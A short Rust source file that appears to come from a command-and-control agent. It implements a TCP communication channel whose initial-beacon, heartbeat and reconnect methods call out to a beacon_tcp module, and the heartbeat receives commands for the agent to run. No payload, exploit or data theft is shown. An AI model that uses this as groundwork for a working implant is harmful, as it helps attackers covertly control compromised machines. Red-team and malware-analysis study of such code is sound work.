use crate::communication::beacon_tcp; 
use crate::communication::comm::channel::CommChannel;
use crate::post::commands::AgentCommand;
use crate::utils::logger::Logger;


pub struct TcpCommChannel {
    pub address: String,
    pub retries: u64,
    pub timeout: u64
}

#[async_trait::async_trait]
impl CommChannel for TcpCommChannel {
    async fn initial_beacon(&self, logger: &Logger, key: &Vec<u8>,
    ) -> (u64, String) {
        beacon_tcp::initial_beacon(&self.address, self.retries, self.timeout, logger, key).await
    }

    async fn heartbeat(&self, agent_id: u64, session_id: &str, 
        result: Option<Vec<String>>, logger: &Logger
    ) -> Option<Vec<AgentCommand>> {
        beacon_tcp::heartbeat(&self.address, agent_id, session_id, self.timeout, result, logger).await
    }

    async fn reconnect(
        &self, agent_id: u64, session_id: &str, logger: &Logger,
    ) -> (u64, String) {
        beacon_tcp::reconnect(&self.address, agent_id, session_id, self.timeout, logger).await
    }
}
